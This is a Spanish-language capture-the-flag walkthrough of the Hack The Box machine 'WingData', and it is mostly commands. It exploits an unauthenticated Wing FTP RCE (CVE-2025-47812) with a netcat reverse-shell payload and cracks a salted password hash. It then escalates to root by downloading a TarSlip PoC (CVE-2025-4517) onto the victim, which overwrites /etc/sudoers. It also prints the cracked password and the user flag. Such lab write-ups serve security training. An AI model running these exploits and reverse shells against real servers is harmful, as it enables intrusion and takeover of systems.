## Enumeración Web

Al entrar a `http://wingdata.htb` se encuentra un botón de **Staff Login** que redirige a `http://ftp.wingdata.htb`. Como no carga, se agrega el subdominio:

```bash
echo "10.129.X.X ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

El portal muestra **Wing FTP Server v7.4.3** en el footer. Se busca si tiene exploits conocidos:

```bash
searchsploit wing ftp
```

Resultado: `Wing FTP Server 7.4.3 - Unauthenticated RCE (CVE-2025-47812)`.

## Foothold — CVE-2025-47812

La vulnerabilidad permite inyectar código Lua en archivos de sesión a través de null bytes en el campo username. Es explotable con la cuenta anonymous.

```bash
searchsploit -m 52347
```

Se inicia el listener y se lanza el exploit:

```bash
nc -nlvp 9443
python3 52347.py -u http://ftp.wingdata.htb -c 'busybox nc TU_IP 9443 -e sh' -v
```

Se obtiene shell como `wingftp`. Se mejora la TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

## Movimiento lateral — Hash cracking

Se enumeran los archivos del servidor FTP:

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml
```

Se extrae el hash SHA-256 de `wacky`. El salt por defecto de Wing FTP es `WingFTP`:

```bash
hashcat -m 1410 -a 0 'HASH:WingFTP' /usr/share/wordlists/rockyou.txt
```

Contraseña obtenida: `!#7Blushing^*Bride5`. Se accede por SSH:

```bash
ssh wacky@wingdata.htb
cat user.txt
```

**User flag:** `097648b3edba93adeb533414f1c181ee`

## Escalada de privilegios — CVE-2025-4517

```bash
sudo -l
```

`wacky` puede ejecutar como root: `/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *`

El script extrae archivos TAR usando `tarfile.extractall()` con `filter="data"`, vulnerable a CVE-2025-4517 (TarSlip via symlink + hardlink chain). Se descarga el PoC:

```bash
# En Kali
wget https://raw.githubusercontent.com/AzureADTrent/CVE-2025-4517-POC/refs/heads/main/CVE-2025-4517-POC.py
python3 -m http.server 8080

# En la víctima
wget http://TU_IP:8080/CVE-2025-4517-POC.py -O /tmp/exploit.py
python3 /tmp/exploit.py
```

El exploit crea un TAR malicioso que sobreescribe `/etc/sudoers`, otorgando acceso total a `wacky`:

```bash
sudo /bin/bash
cat /root/root.txt
```

**Root flag obtenida.**

## Resumen del attack chain

Nmap (puertos 22/80) → vhost enumeration → Wing FTP v7.4.3 → RCE sin autenticación (CVE-2025-47812) → shell como wingftp → hash SHA-256 con salt WingFTP → lateral movement a wacky → sudo misconfiguration + TarSlip (CVE-2025-4517) → root.
